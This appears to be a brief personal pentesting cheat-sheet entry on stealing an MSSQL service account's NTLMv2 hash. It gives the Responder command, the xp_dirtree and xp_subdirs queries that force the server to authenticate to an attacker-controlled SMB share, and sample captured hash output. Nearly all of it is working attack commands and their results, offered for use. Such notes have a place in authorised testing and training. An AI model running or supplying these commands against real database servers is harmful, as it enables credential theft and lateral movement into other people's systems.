this steals the mssql service hash.

# set up responder or impackets
```
sudo responder -I tun0
```

# execute sql query
```
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```
or
```
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```


>[SMB] NTLMv2-SSP Client   : 10.10.110.17  
[SMB] NTLMv2-SSP Username : SRVMSSQL\luser  
[SMB] NTLMv2-SSP Hash     : luser::WIN7BOX:5e3ab1b4390b94a1:A18830632D52768450B7E2425C4A7107:0101000000000000009BFFB9DE3D..........  















